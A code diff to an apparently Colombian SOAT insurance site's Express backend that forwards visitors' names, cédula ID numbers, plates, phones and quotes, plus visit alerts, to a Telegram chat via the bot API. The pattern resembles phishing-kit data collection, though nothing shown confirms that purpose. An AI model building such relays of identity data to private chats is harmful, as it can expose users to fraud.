@@ -11,13 +11,19 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 app.post('/notificar', async (req, res) => {
-  const { nombre, cedula, placa, telefono } = req.body;
+  const { nombre, cedula, placa, telefono, tipo, clase, subtipo, valor, fecha } = req.body;
 
-  const mensaje = `🚗 Nueva solicitud de SOAT:
-Nombre: ${nombre}
-Cédula: ${cedula}
-Placa: ${placa}
-Teléfono: ${telefono}`;
+  let mensaje = '';
+
+  if (tipo === 'cotizacion') {
+    mensaje = `🧾 Nueva cotización:\nPlaca: ${placa}\nClase: ${clase}\nSubtipo: ${subtipo}\nValor estimado: ${valor}`;
+  } else if (tipo === 'datos') {
+    mensaje = `🚗 Nueva compra SOAT:\n\nNombre: ${nombre}\nCédula: ${cedula}\nPlaca: ${placa}\nTeléfono: ${telefono}\nValor cotizado: ${valor}`;
+  } else if (tipo === 'visita') {
+    mensaje = `👀 Nueva visita al sitio SOAT\nFecha: ${fecha || new Date().toLocaleString()}`;
+  } else {
+    mensaje = `📨 Nueva notificación:\nNombre: ${nombre}\nCédula: ${cedula}\nPlaca: ${placa}\nTeléfono: ${telefono}`;
+  }
 
   try {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -27,7 +33,7 @@ Teléfono: ${telefono}`;
 
     res.status(200).json({ ok: true, msg: 'Notificación enviada a Telegram' });
   } catch (error) {
-    console.error('Error enviando a Telegram:', error.message);
+    console.error('❌ Error enviando a Telegram:', error.response?.data || error.message);
     res.status(500).json({ ok: false, msg: 'Error enviando a Telegram' });
   }
 });
